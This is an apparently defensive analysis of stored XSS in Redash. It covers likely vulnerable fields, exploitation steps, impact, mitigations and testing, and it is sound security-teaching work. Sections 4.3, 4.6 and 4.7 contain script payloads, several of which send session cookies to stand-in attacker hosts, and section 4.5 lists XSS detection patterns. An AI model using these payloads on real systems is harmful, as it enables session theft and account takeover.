### 4. Deep Analysis of Stored XSS in Redash

#### 4.1. Attack Vector Details: Stored XSS

**Definition:** Stored XSS (also known as Persistent XSS or Type-II XSS) occurs when malicious scripts are injected into a web application's database or persistent storage. These scripts are then retrieved and executed by the application when legitimate users access the stored data.

**How it Works in Redash Context:**

In Redash, users can create and manage various resources that involve storing text-based data in the database. Examples include:

*   **Dashboard Names:**  Users can name their dashboards.
*   **Query Descriptions:**  Users can add descriptions to their SQL queries.
*   **Visualization Titles:** Users can title their visualizations (charts, tables, etc.).
*   **Alert Names and Messages:** Users can define alerts with custom names and messages.
*   **Data Source Names and Descriptions:**  Less likely but potentially possible depending on implementation.

If Redash does not properly handle user input in these fields, an attacker can inject malicious JavaScript code instead of legitimate text. This malicious code is then stored in the Redash database.

When another user (or even the attacker themselves in a different session) views a dashboard, query, visualization, or alert that contains the malicious script, the Redash application retrieves this data from the database and renders it in the user's browser. **Crucially, if the application does not properly encode or escape this stored data before rendering it in the HTML context, the browser will execute the injected JavaScript code.**

**Why Stored XSS is High Risk:**

*   **Persistence:** The attack is persistent. Once injected, the malicious script remains in the database and will execute every time the affected content is accessed until the vulnerability is fixed and the malicious data is removed.
*   **Wider Impact:** Stored XSS can affect *all* users who view the compromised content, not just the user who clicked a malicious link (as in Reflected XSS). This significantly increases the potential impact and scope of the attack.
*   **No Social Engineering per User:** Unlike Reflected XSS, which often requires tricking users into clicking malicious links, Stored XSS is triggered automatically when users interact with legitimate application features. This makes it more insidious and harder to detect for end-users.

#### 4.2. Potential Vulnerability Locations in Redash

Based on Redash functionality and the attack path description, potential locations for Stored XSS vulnerabilities include:

*   **Dashboard Management:**
    *   **Dashboard Names:**  When creating or editing dashboards, the dashboard name field is a prime candidate.
    *   **Dashboard Descriptions (if implemented):** If Redash allows dashboard descriptions, this could also be vulnerable.
*   **Query Management:**
    *   **Query Descriptions:**  When creating or editing queries, the description field is a likely target.
    *   **Query Names:**  While less user-facing in display, query names might still be rendered in some UI elements.
*   **Visualization Management:**
    *   **Visualization Titles:**  When creating or editing visualizations, the title field is a high-risk area.
    *   **Visualization Descriptions (if implemented):** Similar to dashboard descriptions.
*   **Alert Management:**
    *   **Alert Names:**  When creating alerts.
    *   **Alert Messages:**  Customizable alert messages are highly susceptible.
*   **Data Source Management (Less Likely but Possible):**
    *   **Data Source Names:**  If data source names are displayed in the UI to users beyond administrators.
    *   **Data Source Descriptions (if implemented):**
*   **User Profile Information (Less Likely in Redash Core, but consider extensions):**
    *   **Usernames or Display Names:** If these are user-editable and rendered in contexts accessible to other users.
    *   **User Profile Descriptions/Bios (if implemented):**

**It's crucial to audit all user input fields in Redash that are stored and subsequently rendered in the UI to identify potential Stored XSS vulnerabilities.**

#### 4.3. Exploitation Steps

An attacker would typically follow these steps to exploit Stored XSS in Redash:

1.  **Identify Vulnerable Input Field:** The attacker first identifies a user-editable field in Redash that is likely vulnerable to Stored XSS. This could be a dashboard name, query description, visualization title, etc.
2.  **Craft Malicious Payload:** The attacker crafts a malicious JavaScript payload. This payload could be designed to:
    *   **Steal Cookies/Session Tokens:**  ` <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script> `
    *   **Redirect Users to Malicious Sites:** ` <script>window.location.href='http://attacker.com/malicious_site'</script> `
    *   **Deface the Page:** ` <script>document.body.innerHTML = '<h1>You have been hacked!</h1>'</script> `
    *   **Perform Actions on Behalf of the User:**  Make API requests to Redash to modify data, create new resources, or perform other actions with the victim's privileges.
    *   **Install Keyloggers or other Malware (more complex):**
3.  **Inject Payload:** The attacker injects the malicious payload into the identified vulnerable input field. For example, they might create a new dashboard and set its name to: `My Dashboard <script>/* Malicious Code Here */</script>`.
4.  **Store Payload:** The attacker saves the changes. The malicious payload is now stored in the Redash database.
5.  **Victim Accesses Compromised Content:** A legitimate Redash user (or multiple users) accesses the dashboard, query, visualization, or alert that contains the malicious payload.
6.  **Payload Execution:** When Redash retrieves the stored data from the database and renders it in the victim's browser, the malicious JavaScript code is executed because of insufficient output encoding.
7.  **Malicious Actions Performed:** The attacker's malicious script performs its intended actions (e.g., steals cookies, redirects users, defaces the page, etc.) within the victim's browser context and with the victim's privileges within Redash.

#### 4.4. Potential Impact

The impact of successful Stored XSS exploitation in Redash can be severe and far-reaching:

*   **Account Takeover:** By stealing session cookies or tokens, attackers can impersonate legitimate users, including administrators, gaining full control over their Redash accounts.
*   **Data Theft and Exfiltration:** Attackers can use XSS to access and exfiltrate sensitive data displayed within Redash dashboards, queries, and visualizations. This could include business intelligence data, database credentials (if exposed in queries), and other confidential information.
*   **Unauthorized Data Modification:** Attackers can use XSS to make API requests to Redash on behalf of the victim, allowing them to modify dashboards, queries, visualizations, data sources, and potentially even delete or corrupt data.
*   **Defacement and Reputation Damage:** Attackers can deface Redash dashboards, displaying malicious messages or images, damaging the organization's reputation and eroding user trust.
*   **Malware Distribution:** In more complex scenarios, attackers could potentially use XSS as a stepping stone to distribute malware to users accessing Redash.
*   **Denial of Service (Indirect):** While not a direct DoS, widespread XSS exploitation could disrupt Redash operations, degrade performance, and make the platform unusable for legitimate users.
*   **Privilege Escalation:** If an attacker compromises a low-privilege user account via XSS, they might be able to leverage further vulnerabilities or misconfigurations to escalate their privileges within Redash or the underlying infrastructure.

**The impact is amplified in Redash because it is often used to visualize and analyze sensitive business data. Compromising Redash can lead to significant data breaches and operational disruptions.**

#### 4.5. Recommended Mitigations

To effectively mitigate Stored XSS vulnerabilities in Redash, the following mitigations are crucial:

1.  **Robust Output Encoding/Escaping (Crucial for Stored XSS):**

    *   **Principle:**  Always encode or escape user-provided data before rendering it in HTML contexts. This prevents the browser from interpreting user input as executable code.
    *   **Implementation in Redash:**
        *   **Identify all locations where user-provided data is rendered in HTML.** This includes dashboard names, query descriptions, visualization titles, alert messages, etc.
        *   **Apply appropriate output encoding based on the context:**
            *   **HTML Entity Encoding:** For rendering text within HTML tags (e.g., `<div>User Input</div>`). Encode characters like `<`, `>`, `&`, `"`, `'` to their HTML entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&apos;`).  This is the most common and essential encoding for XSS prevention.
            *   **JavaScript Escaping:** If user input is dynamically inserted into JavaScript code (which should be avoided if possible, but if necessary), use JavaScript escaping techniques to prevent code injection.
            *   **URL Encoding:** If user input is used in URLs, ensure proper URL encoding.
            *   **CSS Escaping:** If user input is used in CSS styles, use CSS escaping to prevent CSS injection attacks.
        *   **Use Templating Engines with Auto-Escaping:** Modern templating engines (like Jinja2 likely used in Redash - needs verification) often provide auto-escaping features. Ensure these features are enabled and configured correctly for all user-generated content. **Verify that Redash's templating engine is configured for auto-escaping by default and that developers are aware of when and how to disable it (and the security implications of doing so).**
        *   **Context-Aware Encoding:** Choose the encoding method appropriate for the specific context where the data is being rendered (HTML, JavaScript, URL, CSS).

2.  **Input Validation and Sanitization:**

    *   **Principle:** Validate and sanitize user input on the server-side *before* storing it in the database. This helps prevent malicious scripts from ever being stored.
    *   **Implementation in Redash:**
        *   **Server-Side Validation:** Implement server-side validation for all user input fields that are stored in the database.
        *   **Input Sanitization (with Caution):**  Sanitization can be used to remove potentially harmful characters or code from user input. However, **sanitization is complex and error-prone and should be used with extreme caution and as a secondary defense layer, *not* as a replacement for output encoding.**  If sanitization is used, ensure it is done using well-vetted libraries and is regularly reviewed and updated.  **Prefer output encoding as the primary mitigation.**
        *   **Restrict Allowed Characters:** Define allowed character sets for input fields. For example, for names and titles, restrict to alphanumeric characters, spaces, and common punctuation.
        *   **Input Length Limits:** Enforce reasonable length limits on input fields to prevent buffer overflows or other injection attacks.
        *   **Content Security Policy (CSP):** Implement a strong Content Security Policy (CSP) to further restrict the sources from which the browser can load resources (scripts, styles, images, etc.). CSP can help mitigate the impact of XSS even if output encoding is missed in some places.

3.  **Regular Content Audits:**

    *   **Principle:** Periodically audit stored content in the Redash database to identify and remove any suspicious or malicious scripts that might have bypassed initial defenses.
    *   **Implementation in Redash:**
        *   **Automated Audits:** Develop scripts or tools to automatically scan the database for patterns indicative of XSS payloads (e.g., `<script>`, `javascript:`, `onerror=`, etc.) in relevant fields (dashboard names, query descriptions, etc.).
        *   **Manual Audits:**  Conduct periodic manual reviews of stored content, especially after security updates or vulnerability disclosures.
        *   **Reporting Mechanism:** Implement a mechanism for users or administrators to report suspicious content for review and removal.

4.  **Security Awareness Training:**

    *   **Principle:** Educate developers and content creators about XSS vulnerabilities and secure coding practices.
    *   **Implementation in Redash:**
        *   Provide training to the development team on secure coding principles, specifically focusing on XSS prevention and output encoding.
        *   Raise awareness among Redash users about the risks of XSS and the importance of reporting suspicious content.

5.  **Regular Security Testing:**

    *   **Principle:** Conduct regular security testing, including penetration testing and vulnerability scanning, to identify and address potential XSS vulnerabilities proactively.
    *   **Implementation in Redash:**
        *   Include Stored XSS testing in regular security assessments of Redash.
        *   Use automated vulnerability scanners to identify potential XSS vulnerabilities.
        *   Perform manual penetration testing to simulate real-world attacks and uncover more complex vulnerabilities.

#### 4.6. Testing and Verification

To test for Stored XSS vulnerabilities and verify mitigations in Redash, the development team should:

1.  **Manual Testing with Payloads:**
    *   **Identify Input Fields:**  List all user-editable fields identified in section 4.2.
    *   **Inject Test Payloads:**  For each field, inject various XSS payloads, including:
        *   Basic alert: `<script>alert('XSS')</script>`
        *   Cookie theft simulation: `<script>document.location='http://your-test-server/xss_log?cookie='+document.cookie</script>` (replace `http://your-test-server/xss_log` with a server you control to capture data).
        *   More complex payloads that might bypass basic filters (if any are in place).
    *   **Trigger Payload Execution:**  View the content as another user (or in a different browser session) to see if the injected script executes.
    *   **Verify Encoding:** If the payload does *not* execute, inspect the HTML source code to confirm that the input has been properly encoded (e.g., `<script>` is rendered as `&lt;script&gt;`).

2.  **Automated Vulnerability Scanning:**
    *   Use web vulnerability scanners (e.g., OWASP ZAP, Burp Suite Scanner, Nikto) to scan Redash for XSS vulnerabilities. Configure the scanner to test for Stored XSS.
    *   Review the scanner's reports and manually verify any identified potential vulnerabilities.

3.  **Code Review:**
    *   Conduct code reviews of the Redash codebase, focusing on areas where user input is handled and rendered in HTML.
    *   Verify that output encoding is consistently applied in all relevant locations.
    *   Check for any instances where auto-escaping might be disabled or bypassed unintentionally.

4.  **Regression Testing:**
    *   After implementing mitigations, perform regression testing to ensure that the fixes are effective and haven't introduced any new issues.
    *   Include XSS test cases in the automated test suite to prevent regressions in the future.

#### 4.7. Real-World Examples (Hypothetical Redash Scenario)

Imagine an attacker wants to steal administrator session cookies from a Redash instance.

1.  **Attack:** The attacker creates a new dashboard and names it: `Important Metrics <script>document.location='http://attacker-controlled-site.com/cookie_stealer?cookie='+document.cookie</script>`.
2.  **Storage:** Redash stores this dashboard name in the database without proper output encoding.
3.  **Victim:** A Redash administrator logs in and views the dashboards list or accesses the compromised dashboard.
4.  **Execution:** The administrator's browser renders the dashboard name. Because of the missing output encoding, the JavaScript code executes.
5.  **Impact:** The malicious script sends the administrator's session cookie to `attacker-controlled-site.com`. The attacker can now use this cookie to impersonate the administrator and gain full control of the Redash instance, potentially accessing sensitive data, modifying configurations, or even compromising connected data sources.

This scenario highlights the critical risk posed by Stored XSS in Redash and the importance of implementing robust mitigations.
